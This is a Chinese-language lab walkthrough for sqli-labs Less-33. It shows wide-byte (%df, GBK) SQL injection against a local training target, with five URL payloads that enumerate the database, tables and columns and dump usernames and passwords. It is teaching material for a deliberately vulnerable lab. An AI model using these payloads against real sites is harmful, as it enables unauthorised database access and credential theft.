---
title: Less - 33
date: 2023-03-17T12:37:04Z
lastmod: 2023-03-17T12:45:12Z
---

# Less - 33

---

# 通关教程

---

## 1、判断闭合

---

查看一下源码，发现也是用了gbk编码

​![image](assets/image-20230317123907-ugzed60.png)​

在单引号前面输入%df即可让单引号成功逃逸

```http
http://192.168.225.132/sqli-labs/Less-33/?id=1%df'
```

​![image](assets/image-20230317124016-erun6kr.png)​

---

## 2、查看当前库

---

```http
http://192.168.225.132/sqli-labs/Less-33/?id=-1%df' union select 1,2,database()--+
```

​![image](assets/image-20230317124206-m0i4si3.png)​

---

## 3、查看security库下的所有表

---

```http
http://192.168.225.132/sqli-labs/Less-33/?id=-1%df' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+
```

​![image](assets/image-20230317124246-vtui3cq.png)​

---

## 4、查看users表下的所有字段

---

```http
http://192.168.225.132/sqli-labs/Less-33/?id=-1%df' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)--+
```

​![image](assets/image-20230317124350-63ha32m.png)​

---

## 5、查看username,password字段下的所有值

---

```http
http://192.168.225.132/sqli-labs/Less-33/?id=-1%df' union select 1,2,(select group_concat(username,password) from security.users)--+
```

​![image](assets/image-20230317124502-6htie1v.png)​

‍

---
